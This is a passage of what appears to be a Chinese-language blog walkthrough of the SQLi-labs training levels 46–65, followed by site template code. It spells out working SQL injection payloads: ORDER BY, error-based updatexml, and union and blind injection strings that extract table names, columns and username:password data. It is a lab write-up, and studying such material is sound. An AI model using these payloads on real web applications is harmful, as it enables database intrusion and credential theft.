+<p><strong>ORDER BY注入</strong>特殊，需要用<strong>布尔盲注</strong>或<strong>报错注入</strong>。可以用<code class="language-plaintext highlighter-rouge">and</code>、<code class="language-plaintext highlighter-rouge">into</code>等特殊语法</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">sort</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="mi">1</span><span class="c1">--+</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>用报错注入（有回显）</strong></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre><span class="c1">-- 爆数据库名</span>
+<span class="o">?</span><span class="n">sort</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">database</span><span class="p">()),</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1">-- 爆表名</span>
+<span class="o">?</span><span class="n">sort</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'security'</span><span class="p">)),</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1">-- 爆字段名</span>
+<span class="o">?</span><span class="n">sort</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'users'</span><span class="p">)),</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1">-- 爆数据</span>
+<span class="o">?</span><span class="n">sort</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="n">concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="n">password</span><span class="p">)</span> <span class="k">from</span> <span class="n">users</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)),</span><span class="mi">1</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="less-47less-48less-49">Less-47、Less-48、Less-49</h3>
+
+<p>Less-47和46关差不多，多了一个<code class="language-plaintext highlighter-rouge">'</code>闭合，可以使用报错注入</p>
+
+<p>Less-48没有报错显示，只能盲注。没有闭合。</p>
+
+<p><em>如果为真，按id排序；为假，按其他方式排序。</em>但是页面内容几乎没变，所以只能用时间盲注了。</p>
+
+<p>Less-49也没有报错显示，同样不能用布尔盲注只能用时间盲注。闭合是<code class="language-plaintext highlighter-rouge">'</code>。</p>
+
+<h3 id="less-50less-51less-52less-53">Less-50、Less-51、Less-52、Less-53</h3>
+
+<p>第50关可以使用updatexml进行报错注入，不过这个里面还可以使用堆叠注入，因为使用了mysqli_multi_query函数，支持多条sql语句执行。也可以盲注。</p>
+
+<p>51关<code class="language-plaintext highlighter-rouge">'</code>闭合，可以报错注入，可以堆叠注入，可以盲注。</p>
+
+<p>52关没有闭合，且没有报错显示，只能堆叠注入或者盲注。</p>
+
+<p>53关是字符型，<code class="language-plaintext highlighter-rouge">'</code>闭合，没有报错显示，可以使用堆叠注入和盲注。</p>
+
+<h2 id="挑战">挑战</h2>
+
+<h3 id="less-54联合注入挑战">Less-54(联合注入挑战)</h3>
+
+<p>只有十次输入机会，超过十次所有表名，列名，等等都会随机重置。</p>
+
+<p><strong>人话：在10次内获取所有信息</strong></p>
+
+<p>请求次数：1（确认字段数=3）</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' order by 3--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>请求次数：2（确认显示位）</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">' union select 1,2,3--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>请求次数：3（数据库名、表名）</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">' union select 1,2,concat_ws('</span><span class="o">|</span><span class="s1">',database(),(select group_concat(table_name) from information_schema.tables where table_schema=database()))--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>请求次数：4（爆列名）</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='</span><span class="err">表名</span><span class="s1">'--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>请求次数：5（爆key名）</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">'union select 1,group_concat(列名),3 from 表名--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="less-55">Less-55</h3>
+
+<p>与54关类似，id参数是加了括号的整数<code class="language-plaintext highlighter-rouge">)</code>。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">),</span><span class="mi">3</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span><span class="c1">--+爆表名</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="less-56">Less-56</h3>
+
+<p>与54、55关类似，只是<strong>闭合方式</strong>变成了单引号+括号 <code class="language-plaintext highlighter-rouge">')</code>。</p>
+
+<h3 id="less-57">Less-57</h3>
+
+<p>与54~56关类似，只是<strong>闭合方式</strong>变成了双引号 <code class="language-plaintext highlighter-rouge">"</code>。</p>
+
+<h3 id="less-58报错注入挑战">Less-58(报错注入挑战)</h3>
+
+<p><strong>在5次内获取所有信息</strong></p>
+
+<p>请求次数：1（爆表名）</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span><span class="n">challenges</span><span class="s1">'),0x7e),1)--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>请求次数：2（爆列名）</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span><span class="err">表名</span><span class="s1">'),0x7e),1)--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>请求次数：3（爆key名）</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and updatexml(1,concat(0x7e,(select group_concat(secret_VETJ) from challenges.p7xb809nvh),0x7e),1)--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="less-59">Less-59</h3>
+
+<p>与58关类似，id是整数型。</p>
+
+<h3 id="less-60">Less-60</h3>
+
+<p>与54、55关类似，只是<strong>闭合方式</strong>变成了双引号+括号 <code class="language-plaintext highlighter-rouge">")</code>。</p>
+
+<h3 id="less-61">Less-61</h3>
+
+<p>与54~56关类似，只是<strong>闭合方式</strong>变成了单引号+两个括号 <code class="language-plaintext highlighter-rouge">'))</code>。</p>
+
+<h3 id="less-62盲注挑战">Less-62(盲注挑战)</h3>
+
+<p><strong>在130次内获取所有信息</strong></p>
+
+<p>62关没有报错显示，可以使用布尔盲注和时间注入。id参数是单引号+括号<code class="language-plaintext highlighter-rouge">')</code>。</p>
+
+<h3 id="less-63">Less-63</h3>
+
+<p>与62关类似，只是<strong>闭合方式</strong>变成了单引号<code class="language-plaintext highlighter-rouge">'</code>。</p>
+
+<h3 id="less-64">Less-64</h3>
+
+<p>与62、63关类似，只是<strong>闭合方式</strong>变成了双引号+括号 <code class="language-plaintext highlighter-rouge">")</code>。</p>
+
+<h3 id="less-65">Less-65</h3>
+
+<p>与62~64关类似，id是整数型。</p>
+
+
+                <hr style="visibility: hidden;">
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/%E5%88%86%E7%B1%BB%E5%90%8D%E7%A7%B0/2026/04/03/upload-labs/" data-toggle="tooltip" data-placement="top" title="upload-lebs">
+                        上一篇<br>
+                        <span>upload-lebs</span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/%E5%88%86%E7%B1%BB%E5%90%8D%E7%A7%B0/2026/04/17/reverse%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/" data-toggle="tooltip" data-placement="top" title="reverse实用技巧(持续完善)">
+                        下一篇<br>
+                        <span>reverse实用技巧(持续完善)</span>
+                        </a>
+                    </li>
+                    
+                </ul>
+                <hr style="visibility: hidden;">
+
+                <!-- giscus 评论系统 -->
+                <div class="comment">
+                    <h4>💬 评论</h4>
+                    <script src="https://giscus.app/client.js"
+                            data-repo="PurgationDevil/PurgationDevil.github.io"
+                            data-repo-id="R_kgDOR4wBWA"
+                            data-category="General"
+                            data-category-id="DIC_kwDOR4wBWM4C83Ny"
+                            data-mapping="pathname"
+                            data-strict="0"
+                            data-reactions-enabled="1"
+                            data-emit-metadata="0"
+                            data-input-position="bottom"
+                            data-theme="preferred_color_scheme"
+                            data-lang="zh-CN"
+                            crossorigin="anonymous"
+                            async>
+                    </script>
+                </div>
+            </div>  
+
+    <!-- Side Catalog Container -->
+        
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+        
+
+    <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+
+
+
+                <!-- Friends Blog -->
+                
+<hr>
+<h5>FRIENDS</h5>
+<ul class="list-inline">
+  
+  <li><a href="http://qiyue.jiushi.gay/">七月的博客</a></li>
+  
+</ul>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<!-- add support for mathjax by voleking-->
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("//cdnjs.cloudflare.com/ajax/libs/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'right',
+          // icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+</div>
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <p class="copyright text-muted">
+                    Copyright &copy; PurgationDevil Blog 2026
+                    <br>
+                    Powered by Jekyll
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js "></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js "></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js "></script>
+
+<!-- Simple Jekyll Search -->
+<script src="/js/simple-jekyll-search.min.js"></script>
+<script>
+(function() {
+    SimpleJekyllSearch({
+        searchInput: document.getElementById('search-input'),
+        resultsContainer: document.getElementById('search-results'),
+        json: '/search.json',
+        searchResultTemplate: '<div class="post-preview"><a href="{url}"><h2 class="post-title">{title}</h2><div class="post-meta">标签: {tags} | {date}</div></a></div>',
+        noResultsText: '<div class="alert alert-warning">没有找到相关文章</div>'
+    });
+    
+    var searchPage = document.querySelector('.search-page');
+    var searchIcon = document.querySelector('.search-icon a');
+    var searchClose = document.querySelector('.search-icon-close');
+    var searchInput = document.getElementById('search-input');
+    
+    if (searchIcon) {
+        searchIcon.addEventListener('click', function() {
+            searchPage.classList.add('search-active');
+            setTimeout(function() {
+                searchInput.focus();
+            }, 400);
+        });
+    }
+    
+    if (searchClose) {
+        searchClose.addEventListener('click', function() {
+            searchPage.classList.remove('search-active');
+        });
+    }
+    
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape' && searchPage.classList.contains('search-active')) {
+            searchPage.classList.remove('search-active');
+        }
+    });
+})();
+</script>
+
+<!-- Service Worker -->
+
+<script src="/js/snackbar.js "></script>
+<script src="/js/sw-registration.js "></script>
+
+
+
+<!-- 回到顶部按钮 -->
+<style>
+.go-top {
+  position: fixed;
+  bottom: 30px;
+  right: 30px;
+  width: 48px;
+  height: 48px;
+  background: #0085a1;
+  color: #fff;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  font-size: 25px;
+  padding-left: 19px;
+  font-weight: bold;
+  opacity: 0;
+  visibility: hidden;
+  transition: all 0.3s ease;
+  z-index: 999;
+  box-shadow: 0 2px 12px rgba(0,0,0,0.15);
+  text-decoration: none;
+  border: none;
+}
+
+.go-top:hover {
+  background: #006680;
+  transform: scale(1.08);
+}
+
+.go-top.show {
+  opacity: 1;
+  visibility: visible;
+}
+
+@media (max-width: 768px) {
+  .go-top {
+    bottom: 20px;
+    right: 20px;
+    width: 42px;
+    height: 42px;
+    font-size: 20px;
+  }
+}
+
+/* 手机端浮动目录按钮 - 默认隐藏 */
+.toc-mobile-btn {
+  position: fixed;
+  right: 15px;
+  bottom: 100px;
+  width: 45px;
+  height: 45px;
+  background: #0085a1;
+  color: #fff;
+  border-radius: 50%;
+  align-items: center;
+  justify-content: center;
+  font-size: 18px;
+  box-shadow: 0 2px 12px rgba(0,0,0,0.2);
+  cursor: pointer;
+  z-index: 1000;
+  display: none !important;
+}
+
+.toc-mobile-panel {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.8);
+  z-index: 2000;
+  transform: translateX(-100%);
+  transition: transform 0.3s ease;
+}
+
+.toc-mobile-panel.active {
+  transform: translateX(0);
+}
+
+.toc-mobile-content {
+  position: absolute;
+  left: 0;
+  top: 0;
+  width: 85%;
+  max-width: 320px;
+  height: 100%;
+  background: #fff;
+  padding: 20px;
+  overflow-y: auto;
+}
+
+.toc-mobile-content h4 {
+  margin: 0 0 15px 0;
+  font-size: 16px;
+  font-weight: 600;
+  color: #333;
+  padding-bottom: 10px;
+  border-bottom: 2px solid #0085a1;
+}
+
+.toc-mobile-content ul {
+  list-style: none;
+  padding-left: 0;
+  margin: 0;
+}
+
+.toc-mobile-content li {
+  margin: 10px 0;
+}
+
+.toc-mobile-content a {
+  color: #555;
+  text-decoration: none;
+  font-size: 14px;
+  display: block;
+  padding: 8px;
+  border-radius: 4px;
+  transition: all 0.2s;
+}
+
+.toc-mobile-content a:hover,
+.toc-mobile-content a.active {
+  background: #f0f0f0;
+  color: #0085a1;
+}
+
+.toc-mobile-close {
+  position: absolute;
+  right: 15px;
+  top: 15px;
+  font-size: 24px;
+  color: #999;
+  cursor: pointer;
+}
+
+/* 手机端显示目录按钮 */
+@media (max-width: 992px) {
+  .toc-mobile-btn.show {
+    display: flex !important;
+    align-items: center !important;
+    justify-content: center !important;
+  }
+}
+
+/* 深色模式手机端目录 */
+@media (prefers-color-scheme: dark) {
+  .toc-mobile-content {
+    background: #0a141e;
+  }
+  
+  .toc-mobile-content h4 {
+    color: #fff;
+    border-bottom-color: #00d4ff;
+  }
+  
+  .toc-mobile-content a {
+    color: #d4d4d4;
+  }
+  
+  .toc-mobile-content a:hover,
+  .toc-mobile-content a.active {
+    background: rgba(0, 212, 255, 0.15);
+    color: #00d4ff;
+  }
+  
+  .toc-mobile-close {
+    color: #666;
+  }
+}
+</style>
+
+<div class="go-top" id="goTopBtn">↑</div>
+
+<!-- 手机端目录按钮 -->
+<div class="toc-mobile-btn" id="tocMobileBtn">☰</div>
+
+<!-- 手机端目录面板 -->
+<div class="toc-mobile-panel" id="tocMobilePanel">
+  <div class="toc-mobile-content">
+    <div class="toc-mobile-close" id="tocMobileClose">×</div>
+    <h4>📖 目录</h4>
+    <ul id="tocMobileList"></ul>
+  </div>
+</div>
+
+<script>
+(function() {
+  var btn = document.getElementById('goTopBtn');
+  if (!btn) return;
+  
+  window.addEventListener('scroll', function() {
+    if (window.scrollY > 300) {
+      btn.classList.add('show');
+    } else {
+      btn.classList.remove('show');
+    }
+  });
+  
+  btn.addEventListener('click', function() {
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  });
+})();
+</script>
+
+<!-- 目录功能 JavaScript -->
+<script>
+(function() {
+  function initToc() {
+    var article = document.querySelector('.post-container');
+    if (!article) return;
+    
+    var headers = article.querySelectorAll('h2, h3');
+    if (headers.length === 0) return;
+    
+    // 显示目录按钮（只有文章页面才显示）
+    var mobileBtn = document.getElementById('tocMobileBtn');
+    if (mobileBtn) {
+      mobileBtn.classList.add('show');
+    }
+    
+    // 创建手机端目录列表
+    var mobileTocList = document.getElementById('tocMobileList');
+    if (!mobileTocList) return;
+    mobileTocList.innerHTML = '';
+    
+    headers.forEach(function(header, index) {
+      var id = 'toc-' + index;
+      header.id = id;
+      
+      // 手机端目录项
+      var mobileLi = document.createElement('li');
+      var mobileA = document.createElement('a');
+      mobileA.href = '#' + id;
+      mobileA.textContent = header.textContent;
+      mobileA.addEventListener('click', function(e) {
+        e.preventDefault();
+        document.getElementById(id).scrollIntoView({ behavior: 'smooth', block: 'start' });
+        document.getElementById('tocMobilePanel').classList.remove('active');
+      });
+      mobileLi.appendChild(mobileA);
+      mobileTocList.appendChild(mobileLi);
+    });
+    
+    // 高亮当前章节
+    var tocLinks = document.querySelectorAll('.toc-mobile-content a');
+    window.addEventListener('scroll', function() {
+      var scrollPos = window.scrollY + 100;
+      var currentId = null;
+      
+      headers.forEach(function(header) {
+        var offsetTop = header.offsetTop;
+        if (offsetTop <= scrollPos) {
+          currentId = header.id;
+        }
+      });
+      
+      tocLinks.forEach(function(link) {
+        link.classList.remove('active');
+        var href = link.getAttribute('href').substring(1);
+        if (href === currentId) {
+          link.classList.add('active');
+        }
+      });
+    });
+  }
+  
+  // 手机端目录按钮事件
+  var mobileBtn = document.getElementById('tocMobileBtn');
+  var mobilePanel = document.getElementById('tocMobilePanel');
+  var mobileClose = document.getElementById('tocMobileClose');
+  
+  if (mobileBtn && mobilePanel) {
+    mobileBtn.addEventListener('click', function() {
+      mobilePanel.classList.add('active');
+    });
+  }
+  
+  if (mobileClose && mobilePanel) {
+    mobileClose.addEventListener('click', function() {
+      mobilePanel.classList.remove('active');
+    });
+  }
+  
+  if (mobilePanel) {
+    mobilePanel.addEventListener('click', function(e) {
+      if (e.target === mobilePanel) {
+        mobilePanel.classList.remove('active');
+      }
+    });
+  }
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initToc);
+  } else {
+    initToc();
+  }
+})();
+</script>
+
+<!-- 代码块深色主题（统一风格） -->
+<style>
+.highlight,
+pre.highlight {
+    background: #282c34 !important;
+    color: #abb2bf !important;
+    border-radius: 8px;
+    padding: 12px;
+    overflow-x: auto;
+}
+
+/* 代码块内文字颜色 */
+.highlight .c  { color: #5c6370 !important; font-style: italic; } /* 注释 */
+.highlight .k  { color: #c678dd !important; } /* 关键字 */
+.highlight .s  { color: #98c379 !important; } /* 字符串 */
+.highlight .n  { color: #abb2bf !important; } /* 变量名 */
+.highlight .p  { color: #abb2bf !important; } /* 括号 */
+.highlight .cm { color: #5c6370 !important; } /* 多行注释 */
+.highlight .nt { color: #e06c75 !important; } /* 标签 */
+
+/* 补充更多代码高亮样式 */
+.highlight .err { color: #960050 !important; background-color: #1e0010 !important; }
+.highlight .l { color: #98c379 !important; }
+.highlight .o { color: #abb2bf !important; }
+.highlight .cp { color: #5c6370 !important; font-style: italic; }
+.highlight .c1 { color: #5c6370 !important; font-style: italic; }
+.highlight .cs { color: #5c6370 !important; font-style: italic; }
+.highlight .kc { color: #c678dd !important; }
+.highlight .kd { color: #c678dd !important; }
+.highlight .kn { color: #c678dd !important; }
+.highlight .kp { color: #c678dd !important; }
+.highlight .kr { color: #c678dd !important; }
+.highlight .kt { color: #c678dd !important; }
+.highlight .ld { color: #98c379 !important; }
+.highlight .m { color: #d19a66 !important; }
+.highlight .na { color: #d19a66 !important; }
+.highlight .nb { color: #e5c07b !important; }
+.highlight .nc { color: #e5c07b !important; }
+.highlight .no { color: #e5c07b !important; }
+.highlight .nd { color: #e5c07b !important; }
+.highlight .ni { color: #e5c07b !important; }
+.highlight .ne { color: #e5c07b !important; }
+.highlight .nf { color: #abb2bf !important; }
+.highlight .nl { color: #e5c07b !important; }
+.highlight .nn { color: #abb2bf !important; }
+.highlight .nx { color: #abb2bf !important; }
+.highlight .py { color: #e5c07b !important; }
+.highlight .nv { color: #e5c07b !important; }
+.highlight .ow { font-weight: 700; }
+.highlight .w { color: #f8f8f2 !important; }
+.highlight .mf { color: #d19a66 !important; }
+.highlight .mh { color: #d19a66 !important; }
+.highlight .mi { color: #d19a66 !important; }
+.highlight .mo { color: #d19a66 !important; }
+.highlight .sb { color: #98c379 !important; }
+.highlight .sc { color: #98c379 !important; }
+.highlight .sd { color: #98c379 !important; }
+.highlight .s2 { color: #98c379 !important; }
+.highlight .se { color: #98c379 !important; }
+.highlight .sh { color: #98c379 !important; }
+.highlight .si { color: #98c379 !important; }
+.highlight .sx { color: #98c379 !important; }
+.highlight .sr { color: #56b6c2 !important; }
+.highlight .s1 { color: #98c379 !important; }
+.highlight .ss { color: #56b6c2 !important; }
+.highlight .bp { color: #e5c07b !important; }
+.highlight .vc { color: #e5c07b !important; }
+.highlight .vg { color: #e5c07b !important; }
+.highlight .vi { color: #e06c75 !important; }
+.highlight .il { color: #d19a66 !important; }
+
+/* 行号样式 */
+.highlight .lineno {
+    color: #5c6370 !important;
+    padding-right: 12px;
+    border-right: 1px solid #3e4451;
+    margin-right: 12px;
+}
+</style>
+
+<!-- 搜索页面样式 -->
+<style>
+.search-page {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: #fff;
+  z-index: 2000;
+  transform: translateY(100%);
+  transition: transform 0.4s ease;
+  overflow-y: auto;
+}
+
+.search-page.search-active {
+  transform: translateY(0);
+}
+
+.search-icon-close-container {
+  position: absolute;
+  top: 20px;
+  right: 20px;
+  cursor: pointer;
+  font-size: 24px;
+  z-index: 2001;
+}
+
+.search-main {
+  padding-top: 80px;
+}
+
+#search-input {
+  width: 100%;
+  padding: 15px;
+  font-size: 24px;
+  border: none;
+  border-bottom: 2px solid #0085a1;
+  outline: none;
+}
+
+#search-results {
+  margin-top: 30px;
+}
+</style>
+
+<!-- 页面背景和文字颜色样式 - 跟随系统主题 -->
+<style>
+:root {
+  --bg-color: #ffffff;
+  --text-color: #333333;
+  --text-light: #666666;
+  --heading-color: #000000;
+  --link-color: #0085a1;
+  --navbar-bg: rgba(255, 255, 255, 0.85);
+  --navbar-text: #66ccff;
+  --gradient-end: rgba(255, 255, 255, 1);
+}
+
+@media (prefers-color-scheme: dark) {
+  :root {
+    --bg-color: #0a141e;
+    --text-color: #e6e6e6;
+    --text-light: #d4d4d4;
+    --heading-color: #ffffff;
+    --link-color: #00d4ff;
+    --navbar-bg: rgba(10, 20, 30, 0.85);
+    --navbar-text: #66ccff;
+    --gradient-end: rgba(10, 20, 30, 1);
+  }
+}
+
+body {
+  background-color: var(--bg-color) !important;
+  color: var(--text-color) !important;
+}
+
+.post-container,
+.article-container {
+  color: var(--text-color) !important;
+}
+
+.post-container p,
+.post-container li,
+.post-container span {
+  color: var(--text-light) !important;
+}
+
+.post-container h1,
+.post-container h2,
+.post-container h3,
+.post-container h4,
+.post-container h5,
+.post-container h6 {
+  color: var(--heading-color) !important;
+}
+
+.post-container a {
+  color: var(--link-color) !important;
+}
+
+.navbar-custom .nav li a,
+.navbar-custom .navbar-brand {
+    color: var(--navbar-text) !important;
+}
+
+.navbar-custom .nav li a:hover,
+.navbar-custom .navbar-brand:hover {
+    color: #3399ff !important;
+}
+
+.navbar-custom {
+    background-color: var(--navbar-bg) !important;
+}
+
+.intro-header .site-heading h1,
+.intro-header .page-heading h1 {
+    color: #ffffff !important;
+    font-size: 60px !important;
+}
+
+.intro-header .site-heading .subheading {
+    color: #ffffff !important;
+}
+
+.intro-header {
+    position: relative;
+}
+
+.intro-header::after {
+    content: "";
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    height: 120px;
+    background: linear-gradient(to bottom, rgba(255, 255, 255, 0), var(--gradient-end));
+    pointer-events: none;
+}
+
+@media (prefers-color-scheme: dark) {
+  /* 首页文章卡片 */
+  .post-card {
+    border-bottom-color: rgba(255, 255, 255, 0.1) !important;
+  }
+  .post-card-title a {
+    color: #ffffff !important;
+  }
+  .post-card-title a:hover {
+    color: #00d4ff !important;
+  }
+  .post-card-date,
+  .post-card-meta {
+    color: #b3b3b3 !important;
+  }
+  .post-card-excerpt {
+    color: #d4d4d4 !important;
+  }
+  
+  /* 归档页面 */
+  .archive-year {
+    color: #ffffff !important;
+    border-left-color: #00d4ff !important;
+  }
+  .archive-date {
+    color: #b3b3b3 !important;
+  }
+  .archive-item a {
+    color: #e6e6e6 !important;
+  }
+  .archive-item a:hover {
+    color: #00d4ff !important;
+  }
+  
+  /* 归档标签按钮 */
+  #tag_cloud a,
+  #tag_cloud .tag-button--all {
+    background: rgba(255, 255, 255, 0.1) !important;
+    color: #e6e6e6 !important;
+  }
+  #tag_cloud a.active,
+  #tag_cloud .tag-button--all.active {
+    background: #0085a1 !important;
+    color: #ffffff !important;
+  }
+  #tag_cloud a:hover,
+  #tag_cloud .tag-button--all:hover {
+    background: rgba(0, 212, 255, 0.3) !important;
+    color: #ffffff !important;
+  }
+  #tag_cloud sup {
+    color: #999 !important;
+  }
+  #tag_cloud a.active sup,
+  #tag_cloud .tag-button--all.active sup {
+    color: #ffffff !important;
+  }
+  
+  .waifu-tips {
+    background-color: rgba(30, 40, 60, 0.9) !important;
+    border-color: rgba(0, 212, 255, 0.5) !important;
+    box-shadow: 0 3px 15px 2px rgba(0, 212, 255, 0.2) !important;
